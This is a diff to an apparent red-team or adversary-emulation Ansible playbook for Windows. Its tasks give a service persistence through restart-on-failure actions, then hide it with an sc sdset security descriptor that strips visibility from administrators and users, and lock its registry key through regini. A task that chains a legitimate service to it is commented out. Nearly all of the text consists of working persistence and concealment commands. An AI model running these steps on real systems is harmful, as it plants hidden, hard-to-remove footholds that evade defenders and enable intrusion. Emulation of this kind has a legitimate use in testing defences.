@@ -18,7 +18,7 @@
 
     - name: "Add persisstence using service failover"
       win_command:
-        cmd: sc failure {{ service_name }} reset= 0 actions= restart/5000
+        cmd: sc failure {{ service_name }} reset= 0 actions= restart/1000
       tags:
         - add_persistence
 
@@ -35,23 +35,11 @@
       tags:
         - reg_params
 
-    - name: "Change permissions on registry"
-      win_shell: |
-        cmd /c "echo {{ reg_key_param }}\\{{ service_name}} [19] > C:\Windows\Temp\set_perm.regini"
-        cmd /c "regini C:\Windows\Temp\set_perm.regini"
-        cmd /c "del C:\Windows\Temp\set_perm.regini"
-      tags:
-        - reg_perms
-
-    - name: "Change dependency of legitimate service"
-      win_shell: |
-        cmd /c "sc config {{ service_for_injection }} depend= {{ service_name }}"
-      tags:
-        - add_depend
-
-    - name: "Hide a serivice"
-      win_shell:  
-        cmd /c sc sdset "{{ service_name }}" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+    # - name: "Change dependency of legitimate service"
+    #   win_shell: |
+    #     cmd /c "sc config {{ service_for_injection }} depend= {{ service_name }}"
+    #   tags:
+    #     - add_depend
 
     - name: "Start the service"
       win_service:
@@ -59,3 +47,17 @@
         state: started
       tags:
         - start_svc
+
+    - name: "Hide a serivice"
+      win_shell:  
+        cmd /c sc sdset "{{ service_name }}" "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+      tags:
+        - hide_svc
+
+    - name: "Change permissions on registry"
+      win_shell: |
+        cmd /c "echo {{ reg_restrict }}\\{{ service_name }} [19] > C:\Windows\Temp\set_perm.regini"
+        cmd /c "regini C:\Windows\Temp\set_perm.regini"
+        cmd /c "del C:\Windows\Temp\set_perm.regini"
+      tags:
+        - reg_perms
